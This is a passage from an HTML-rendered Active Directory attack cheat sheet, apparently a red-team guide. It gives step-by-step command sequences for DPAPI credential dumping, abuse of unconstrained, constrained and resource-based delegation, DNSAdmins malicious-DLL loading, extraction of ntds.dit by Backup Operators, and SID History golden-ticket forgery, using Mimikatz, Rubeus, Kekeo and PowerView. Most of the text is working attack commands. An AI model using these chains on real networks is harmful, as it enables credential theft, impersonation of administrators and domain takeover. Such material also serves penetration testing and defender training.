<a href="#__codelineno-43-15" id="__codelineno-43-15" name="__codelineno-43-15"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span>
</code></pre></div> <p>Detailed Article: <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">DPAPI all the things</a></p> <h3 id="unconstrained-delegation">Unconstrained Delegation<a class="headerlink" href="#unconstrained-delegation" title="Permanent link"></a></h3> <p><em>What's that?</em> If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_</p> <p>Using PowerView:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-44-1" id="__codelineno-44-1" name="__codelineno-44-1"></a><span class="c">#Discover domain joined computers that have Unconstrained Delegation enabled</span>
<a href="#__codelineno-44-2" id="__codelineno-44-2" name="__codelineno-44-2"></a><span class="nb">Get-NetComputer</span> <span class="n">-UnConstrained</span>
<a href="#__codelineno-44-3" id="__codelineno-44-3" name="__codelineno-44-3"></a>
<a href="#__codelineno-44-4" id="__codelineno-44-4" name="__codelineno-44-4"></a><span class="c">#List tickets and check if a DA or some High Value target has stored its TGT</span>
<a href="#__codelineno-44-5" id="__codelineno-44-5" name="__codelineno-44-5"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"sekurlsa::tickets"'</span>
<a href="#__codelineno-44-6" id="__codelineno-44-6" name="__codelineno-44-6"></a>
<a href="#__codelineno-44-7" id="__codelineno-44-7" name="__codelineno-44-7"></a><span class="c">#Command to monitor any incoming sessions on our compromised server</span>
<a href="#__codelineno-44-8" id="__codelineno-44-8" name="__codelineno-44-8"></a><span class="nb">Invoke-UserHunter</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfTheComputer</span><span class="p">&gt;</span> <span class="n">-Poll</span> <span class="p">&lt;</span><span class="n">TimeOfMonitoringInSeconds</span><span class="p">&gt;</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">UserToMonitorFor</span><span class="p">&gt;</span> <span class="n">-Delay</span>
<a href="#__codelineno-44-9" id="__codelineno-44-9" name="__codelineno-44-9"></a><span class="p">&lt;</span><span class="n">WaitInterval</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a href="#__codelineno-44-10" id="__codelineno-44-10" name="__codelineno-44-10"></a>
<a href="#__codelineno-44-11" id="__codelineno-44-11" name="__codelineno-44-11"></a><span class="c">#Dump the tickets to disk:</span>
<a href="#__codelineno-44-12" id="__codelineno-44-12" name="__codelineno-44-12"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"sekurlsa::tickets /export"'</span>
<a href="#__codelineno-44-13" id="__codelineno-44-13" name="__codelineno-44-13"></a>
<a href="#__codelineno-44-14" id="__codelineno-44-14" name="__codelineno-44-14"></a><span class="c">#Impersonate the user using ptt attack:</span>
<a href="#__codelineno-44-15" id="__codelineno-44-15" name="__codelineno-44-15"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::ptt &lt;PathToTicket&gt;"'</span>
</code></pre></div> <p><strong>Note:</strong> We can also use Rubeus!</p> <h3 id="constrained-delegation">Constrained Delegation<a class="headerlink" href="#constrained-delegation" title="Permanent link"></a></h3> <p>Using PowerView and Kekeo:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-45-1" id="__codelineno-45-1" name="__codelineno-45-1"></a><span class="c">#Enumerate Users and Computers with constrained delegation</span>
<a href="#__codelineno-45-2" id="__codelineno-45-2" name="__codelineno-45-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
<a href="#__codelineno-45-3" id="__codelineno-45-3" name="__codelineno-45-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
<a href="#__codelineno-45-4" id="__codelineno-45-4" name="__codelineno-45-4"></a>
<a href="#__codelineno-45-5" id="__codelineno-45-5" name="__codelineno-45-5"></a><span class="c">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo</span>
<a href="#__codelineno-45-6" id="__codelineno-45-6" name="__codelineno-45-6"></a><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">Domain</span><span class="s1">'s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;</span>
<a href="#__codelineno-45-7" id="__codelineno-45-7" name="__codelineno-45-7"></a>
<a href="#__codelineno-45-8" id="__codelineno-45-8" name="__codelineno-45-8"></a><span class="s1">#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation</span>
<a href="#__codelineno-45-9" id="__codelineno-45-9" name="__codelineno-45-9"></a><span class="s1">tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain'</span><span class="n">s</span> <span class="n">FQDN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">service</span><span class="p">:&lt;</span><span class="n">Service</span><span class="s1">'s SPN&gt;</span>
<a href="#__codelineno-45-10" id="__codelineno-45-10" name="__codelineno-45-10"></a>
<a href="#__codelineno-45-11" id="__codelineno-45-11" name="__codelineno-45-11"></a><span class="s1">#Finally use mimikatz to ptt the TGS</span>
<a href="#__codelineno-45-12" id="__codelineno-45-12" name="__codelineno-45-12"></a><span class="s1">Invoke-Mimikatz -Command '</span><span class="s2">"kerberos::ptt &lt;PathToTGS&gt;"</span><span class="err">'</span>
</code></pre></div> <p><em>ALTERNATIVE</em> Using Rubeus:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-46-1" id="__codelineno-46-1" name="__codelineno-46-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">NTLMhashedPasswordOfTheUser</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:&lt;</span><span class="n">UserToImpersonate</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="s2">"&lt;Service's SPN&gt;"</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:&lt;</span><span class="n">Optional</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ptt</span>
</code></pre></div> <p>Now we can access the service as the impersonated user!</p> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f6a9.svg" title=":triangular_flag_on_post:"/> <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p> <p>In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p> <h3 id="resource-based-constrained-delegation">Resource Based Constrained Delegation<a class="headerlink" href="#resource-based-constrained-delegation" title="Permanent link"></a></h3> <p><em>What's that?</em> TL;DR \ If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access._</p> <p>Tools we are going to use:</p> <ul> <li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon">PowerView</a></li> <li><a href="https://github.com/Kevin-Robertson/Powermad">Powermad</a></li> <li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li> </ul> <p>First we need to enter the security context of the user/machine account that has the privileges over the object. If it is a user account we can use Pass the Hash, RDP, PSCredentials etc.</p> <p>Exploitation Example:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-47-1" id="__codelineno-47-1" name="__codelineno-47-1"></a><span class="c">#Import Powermad and use it to create a new MACHINE ACCOUNT</span>
<a href="#__codelineno-47-2" id="__codelineno-47-2" name="__codelineno-47-2"></a><span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="n">ps1</span>
<a href="#__codelineno-47-3" id="__codelineno-47-3" name="__codelineno-47-3"></a><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="p">&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="n">-Password</span> <span class="p">$(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">'p@ssword!'</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span> <span class="n">-Verbose</span>
<a href="#__codelineno-47-4" id="__codelineno-47-4" name="__codelineno-47-4"></a>
<a href="#__codelineno-47-5" id="__codelineno-47-5" name="__codelineno-47-5"></a><span class="c">#Import PowerView and get the SID of our new created machine account</span>
<a href="#__codelineno-47-6" id="__codelineno-47-6" name="__codelineno-47-6"></a><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
<a href="#__codelineno-47-7" id="__codelineno-47-7" name="__codelineno-47-7"></a><span class="nv">$ComputerSid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="p">&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-Expand</span> <span class="n">objectsid</span>
<a href="#__codelineno-47-8" id="__codelineno-47-8" name="__codelineno-47-8"></a>
<a href="#__codelineno-47-9" id="__codelineno-47-9" name="__codelineno-47-9"></a><span class="c">#Then by using the SID we are going to build an ACE for the new created machine account using a raw security descriptor:</span>
<a href="#__codelineno-47-10" id="__codelineno-47-10" name="__codelineno-47-10"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">.</span><span class="n">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="nv">$ComputerSid</span><span class="p">)</span><span class="s2">)"</span>
<a href="#__codelineno-47-11" id="__codelineno-47-11" name="__codelineno-47-11"></a><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
<a href="#__codelineno-47-12" id="__codelineno-47-12" name="__codelineno-47-12"></a><span class="nv">$SD</span><span class="p">.</span><span class="n">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
<a href="#__codelineno-47-13" id="__codelineno-47-13" name="__codelineno-47-13"></a>
<a href="#__codelineno-47-14" id="__codelineno-47-14" name="__codelineno-47-14"></a><span class="c">#Next, we need to set the security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView</span>
<a href="#__codelineno-47-15" id="__codelineno-47-15" name="__codelineno-47-15"></a><span class="nb">Get-DomainComputer</span> <span class="n">TargetMachine</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span> <span class="n">-Verbose</span>
<a href="#__codelineno-47-16" id="__codelineno-47-16" name="__codelineno-47-16"></a>
<a href="#__codelineno-47-17" id="__codelineno-47-17" name="__codelineno-47-17"></a><span class="c">#After that we need to get the RC4 hash of the new machine account's password using Rubeus</span>
<a href="#__codelineno-47-18" id="__codelineno-47-18" name="__codelineno-47-18"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s1">'p@ssword!'</span>
<a href="#__codelineno-47-19" id="__codelineno-47-19" name="__codelineno-47-19"></a>
<a href="#__codelineno-47-20" id="__codelineno-47-20" name="__codelineno-47-20"></a><span class="c">#And for this example, we are going to impersonate Domain Administrator on the cifs service of the target computer using Rubeus</span>
<a href="#__codelineno-47-21" id="__codelineno-47-21" name="__codelineno-47-21"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">MachineAccountName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">RC4HashOfMachineAccountPassword</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">TargetMachine</span><span class="p">.</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span> <span class="p">/</span><span class="n">ptt</span>
<a href="#__codelineno-47-22" id="__codelineno-47-22" name="__codelineno-47-22"></a>
<a href="#__codelineno-47-23" id="__codelineno-47-23" name="__codelineno-47-23"></a><span class="c">#Finally we can access the C$ drive of the target machine</span>
<a href="#__codelineno-47-24" id="__codelineno-47-24" name="__codelineno-47-24"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">TargetMachine</span><span class="p">.</span><span class="n">wtver</span><span class="p">.</span><span class="n">domain</span><span class="p">\</span><span class="n">C</span><span class="p">$</span>
</code></pre></div> <p>Detailed Articles:</p> <ul> <li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</a></li> <li><a href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/">RESOURCE-BASED CONSTRAINED DELEGATION ABUSE</a></li> </ul> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/2757.svg" title=":exclamation:"/> In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-48-1" id="__codelineno-48-1" name="__codelineno-48-1"></a><span class="c">#Command on Rubeus</span>
<a href="#__codelineno-48-2" id="__codelineno-48-2" name="__codelineno-48-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span> <span class="p">/</span><span class="n">nowrap</span>
</code></pre></div> <p>Detailed Article: <a href="https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/">Rubeus  Now With More Kekeo</a></p> <h3 id="dnsadmins-abuse">DNSAdmins Abuse<a class="headerlink" href="#dnsadmins-abuse" title="Permanent link"></a></h3> <p><em>What's that?</em> If a user is a member of the DNSAdmins group, he can possibly load an arbitary DLL with the privileges of dns.exe that runs as SYSTEM. In case the DC serves a DNS, the user can escalate his privileges to DA. This exploitation process needs privileges to restart the DNS service to work._</p> <ol> <li>Enumerate the members of the DNSAdmins group:</li> <li>PowerView: <code>Get-NetGroupMember -GroupName "DNSAdmins"</code></li> <li>AD Module: <code>Get-ADGroupMember -Identiny DNSAdmins</code></li> <li>Once we found a member of this group we need to compromise it (There are many ways).</li> <li>Then by serving a malicious DLL on a SMB share and configuring the dll usage,we can escalate our privileges:</li> </ol> <div class="highlight"><pre><span></span><code><a href="#__codelineno-49-1" id="__codelineno-49-1" name="__codelineno-49-1"></a><span class="c">#Using dnscmd:</span>
<a href="#__codelineno-49-2" id="__codelineno-49-2" name="__codelineno-49-2"></a><span class="n">dnscmd</span> <span class="p">&lt;</span><span class="n">NameOfDNSMAchine</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">serverlevelplugindll</span> <span class="p">\\</span><span class="n">Path</span><span class="p">\</span><span class="n">To</span><span class="p">\</span><span class="n">Our</span><span class="p">\</span><span class="n">Dll</span><span class="p">\</span><span class="n">malicious</span><span class="p">.</span><span class="n">dll</span>
<a href="#__codelineno-49-3" id="__codelineno-49-3" name="__codelineno-49-3"></a>
<a href="#__codelineno-49-4" id="__codelineno-49-4" name="__codelineno-49-4"></a><span class="c">#Restart the DNS Service:</span>
<a href="#__codelineno-49-5" id="__codelineno-49-5" name="__codelineno-49-5"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">DNSServer</span> <span class="n">stop</span> <span class="n">dns</span>
<a href="#__codelineno-49-6" id="__codelineno-49-6" name="__codelineno-49-6"></a><span class="nb">sc </span><span class="p">\\</span><span class="n">DNSServer</span> <span class="nb">start </span><span class="n">dns</span>
</code></pre></div> <h3 id="abusing-active-directory-integraded-dns">Abusing Active Directory-Integraded DNS<a class="headerlink" href="#abusing-active-directory-integraded-dns" title="Permanent link"></a></h3> <ul> <li><a href="https://blog.netspi.com/exploiting-adidns/">Exploiting Active Directory-Integrated DNS</a></li> <li><a href="https://blog.netspi.com/adidns-revisited/">ADIDNS Revisited</a></li> <li><a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a></li> </ul> <h3 id="abusing-backup-operators-group">Abusing Backup Operators Group<a class="headerlink" href="#abusing-backup-operators-group" title="Permanent link"></a></h3> <p><em>What's that?</em> If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA._</p> <ol> <li>Once we have access on an account that has the SeBackupPrivilege we can access the DC and create a shadow copy using the signed binary diskshadow:</li> </ol> <div class="highlight"><pre><span></span><code><a href="#__codelineno-50-1" id="__codelineno-50-1" name="__codelineno-50-1"></a><span class="c">#Create a .txt file that will contain the shadow copy process script</span>
<a href="#__codelineno-50-2" id="__codelineno-50-2" name="__codelineno-50-2"></a><span class="n">Script</span> <span class="p">-&gt;{</span>
<a href="#__codelineno-50-3" id="__codelineno-50-3" name="__codelineno-50-3"></a><span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span> <span class="n">nowriters</span>
<a href="#__codelineno-50-4" id="__codelineno-50-4" name="__codelineno-50-4"></a><span class="nb">set </span><span class="n">metadata</span> <span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">spool</span><span class="p">\</span><span class="n">drivers</span><span class="p">\</span><span class="n">color</span><span class="p">\</span><span class="n">example</span><span class="p">.</span><span class="n">cab</span>
<a href="#__codelineno-50-5" id="__codelineno-50-5" name="__codelineno-50-5"></a><span class="nb">set </span><span class="n">verbose</span> <span class="n">on</span>
<a href="#__codelineno-50-6" id="__codelineno-50-6" name="__codelineno-50-6"></a><span class="k">begin</span> <span class="n">backup</span>
<a href="#__codelineno-50-7" id="__codelineno-50-7" name="__codelineno-50-7"></a><span class="n">add</span> <span class="n">volume</span> <span class="n">c</span><span class="p">:</span> <span class="k">alias</span> <span class="n">mydrive</span>
<a href="#__codelineno-50-8" id="__codelineno-50-8" name="__codelineno-50-8"></a>
<a href="#__codelineno-50-9" id="__codelineno-50-9" name="__codelineno-50-9"></a><span class="n">create</span>
<a href="#__codelineno-50-10" id="__codelineno-50-10" name="__codelineno-50-10"></a>
<a href="#__codelineno-50-11" id="__codelineno-50-11" name="__codelineno-50-11"></a><span class="n">expose</span> <span class="k">%</span><span class="n">mydrive</span><span class="p">%</span> <span class="n">w</span><span class="p">:</span>
<a href="#__codelineno-50-12" id="__codelineno-50-12" name="__codelineno-50-12"></a><span class="k">end</span> <span class="n">backup</span>
<a href="#__codelineno-50-13" id="__codelineno-50-13" name="__codelineno-50-13"></a><span class="p">}</span>
<a href="#__codelineno-50-14" id="__codelineno-50-14" name="__codelineno-50-14"></a>
<a href="#__codelineno-50-15" id="__codelineno-50-15" name="__codelineno-50-15"></a><span class="c">#Execute diskshadow with our script as parameter</span>
<a href="#__codelineno-50-16" id="__codelineno-50-16" name="__codelineno-50-16"></a><span class="n">diskshadow</span> <span class="p">/</span><span class="n">s</span> <span class="n">script</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div> <ol> <li>Next we need to access the shadow copy, we may have the SeBackupPrivilege but we cant just simply copy-paste ntds.dit, we need to mimic a backup software and use Win32 API calls to copy it on an accessible folder. For this we are going to use <a href="https://github.com/giuliano108/SeBackupPrivilege">this</a> amazing repo:</li> </ol> <div class="highlight"><pre><span></span><code><a href="#__codelineno-51-1" id="__codelineno-51-1" name="__codelineno-51-1"></a><span class="c">#Importing both dlls from the repo using powershell</span>
<a href="#__codelineno-51-2" id="__codelineno-51-2" name="__codelineno-51-2"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
<a href="#__codelineno-51-3" id="__codelineno-51-3" name="__codelineno-51-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
<a href="#__codelineno-51-4" id="__codelineno-51-4" name="__codelineno-51-4"></a>
<a href="#__codelineno-51-5" id="__codelineno-51-5" name="__codelineno-51-5"></a><span class="c">#Checking if the SeBackupPrivilege is enabled</span>
<a href="#__codelineno-51-6" id="__codelineno-51-6" name="__codelineno-51-6"></a><span class="nb">Get-SeBackupPrivilege</span>
<a href="#__codelineno-51-7" id="__codelineno-51-7" name="__codelineno-51-7"></a>
<a href="#__codelineno-51-8" id="__codelineno-51-8" name="__codelineno-51-8"></a><span class="c">#If it isn't we enable it</span>
<a href="#__codelineno-51-9" id="__codelineno-51-9" name="__codelineno-51-9"></a><span class="nb">Set-SeBackupPrivilege</span>
<a href="#__codelineno-51-10" id="__codelineno-51-10" name="__codelineno-51-10"></a>
<a href="#__codelineno-51-11" id="__codelineno-51-11" name="__codelineno-51-11"></a><span class="c">#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice</span>
<a href="#__codelineno-51-12" id="__codelineno-51-12" name="__codelineno-51-12"></a><span class="nb">Copy-FileSeBackupPrivilege</span> <span class="n">w</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">c</span><span class="p">:\&lt;</span><span class="n">PathToSave</span><span class="p">&gt;\</span><span class="n">ntds</span><span class="p">.</span><span class="n">dit</span> <span class="n">-Overwrite</span>
<a href="#__codelineno-51-13" id="__codelineno-51-13" name="__codelineno-51-13"></a>
<a href="#__codelineno-51-14" id="__codelineno-51-14" name="__codelineno-51-14"></a><span class="c">#Dump the SYSTEM hive</span>
<a href="#__codelineno-51-15" id="__codelineno-51-15" name="__codelineno-51-15"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">system</span><span class="p">.</span><span class="n">hive</span>
</code></pre></div> <ol> <li>Using smbclient.py from impacket or some other tool we copy ntds.dit and the SYSTEM hive on our local machine.</li> <li>Use secretsdump.py from impacket and dump the hashes.</li> <li>Use psexec or another tool of your choice to PTH and get Domain Admin access.</li> </ol> <h3 id="abusing-exchange">Abusing Exchange<a class="headerlink" href="#abusing-exchange" title="Permanent link"></a></h3> <ul> <li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">Abusing Exchange one Api call from DA</a></li> <li><a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">CVE-2020-0688</a></li> <li><a href="https://github.com/dirkjanm/PrivExchange">PrivExchange</a> Exchange your privileges for Domain Admin privs by abusing Exchange</li> </ul> <h3 id="weaponizing-printer-bug">Weaponizing Printer Bug<a class="headerlink" href="#weaponizing-printer-bug" title="Permanent link"></a></h3> <ul> <li><a href="https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/">Printer Server Bug to Domain Administrator</a></li> <li><a href="https://github.com/NotMedic/NetNTLMtoSilverTicket">NetNTLMtoSilverTicket</a></li> </ul> <h3 id="abusing-acls">Abusing ACLs<a class="headerlink" href="#abusing-acls" title="Permanent link"></a></h3> <ul> <li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory</a></li> <li><a href="https://github.com/fox-it/aclpwn.py">aclpwn.py</a></li> <li><a href="https://github.com/fox-it/Invoke-ACLPwn">Invoke-ACLPwn</a></li> </ul> <h3 id="abusing-ipv6-with-mitm6">Abusing IPv6 with mitm6<a class="headerlink" href="#abusing-ipv6-with-mitm6" title="Permanent link"></a></h3> <ul> <li><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">Compromising IPv4 networks via IPv6</a></li> <li><a href="https://github.com/fox-it/mitm6">mitm6</a></li> </ul> <h3 id="sid-history-abuse">SID History Abuse<a class="headerlink" href="#sid-history-abuse" title="Permanent link"></a></h3> <p><em>What's that?</em> If we manage to compromise a child domain of a forest and <a href="https://www.itprotoday.com/windows-8/sid-filtering">SID filtering</a> isn't enabled (most of the times is not), we can abuse it to privilege escalate to Domain Administrator of the root domain of the forest. This is possible because of the <a href="https://www.itprotoday.com/windows-8/sid-history">SID History</a> field on a kerberos TGT ticket, that defines the "extra" security groups and privileges._</p> <p>Exploitation example:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-52-1" id="__codelineno-52-1" name="__codelineno-52-1"></a><span class="c">#Get the SID of the Current Domain using PowerView</span>
<a href="#__codelineno-52-2" id="__codelineno-52-2" name="__codelineno-52-2"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">current</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a href="#__codelineno-52-3" id="__codelineno-52-3" name="__codelineno-52-3"></a>
<a href="#__codelineno-52-4" id="__codelineno-52-4" name="__codelineno-52-4"></a><span class="c">#Get the SID of the Root Domain using PowerView</span>
<a href="#__codelineno-52-5" id="__codelineno-52-5" name="__codelineno-52-5"></a><span class="nb">Get-DomainSID</span> <span class="n">-Domain</span> <span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
<a href="#__codelineno-52-6" id="__codelineno-52-6" name="__codelineno-52-6"></a>
<a href="#__codelineno-52-7" id="__codelineno-52-7" name="__codelineno-52-7"></a><span class="c">#Create the Enteprise Admins SID</span>
<a href="#__codelineno-52-8" id="__codelineno-52-8" name="__codelineno-52-8"></a><span class="n">Format</span><span class="p">:</span> <span class="n">RootDomainSID</span><span class="p">-</span><span class="n">519</span>
<a href="#__codelineno-52-9" id="__codelineno-52-9" name="__codelineno-52-9"></a>
<a href="#__codelineno-52-10" id="__codelineno-52-10" name="__codelineno-52-10"></a><span class="c">#Forge "Extra" Golden Ticket using mimikatz</span>
<a href="#__codelineno-52-11" id="__codelineno-52-11" name="__codelineno-52-11"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">current</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:&lt;</span><span class="n">CurrentDomainSID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:&lt;</span><span class="n">krbtgtHash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">sids</span><span class="p">:&lt;</span><span class="n">EnterpriseAdminsSID</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">startoffset</span><span class="p">:</span><span class="n">0</span> <span class="p">/</span><span class="n">endin</span><span class="p">:</span><span class="n">600</span> <span class="p">/</span><span class="n">renewmax</span><span class="p">:</span><span class="n">10080</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">ticket</span><span class="p">\</span><span class="n">golden</span><span class="p">.</span><span class="n">kirbi</span>
<a href="#__codelineno-52-12" id="__codelineno-52-12" name="__codelineno-52-12"></a>
<a href="#__codelineno-52-13" id="__codelineno-52-13" name="__codelineno-52-13"></a><span class="c">#Inject the ticket into memory</span>
<a href="#__codelineno-52-14" id="__codelineno-52-14" name="__codelineno-52-14"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">\</span><span class="n">path</span><span class="p">\</span><span class="n">to</span><span class="p">\</span><span class="n">ticket</span><span class="p">\</span><span class="n">golden</span><span class="p">.</span><span class="n">kirbi</span>
<a href="#__codelineno-52-15" id="__codelineno-52-15" name="__codelineno-52-15"></a>
<a href="#__codelineno-52-16" id="__codelineno-52-16" name="__codelineno-52-16"></a><span class="c">#List the DC of the Root Domain</span>
<a href="#__codelineno-52-17" id="__codelineno-52-17" name="__codelineno-52-17"></a><span class="nb">dir </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">root</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">C</span><span class="p">$</span>
<a href="#__codelineno-52-18" id="__codelineno-52-18" name="__codelineno-52-18"></a>
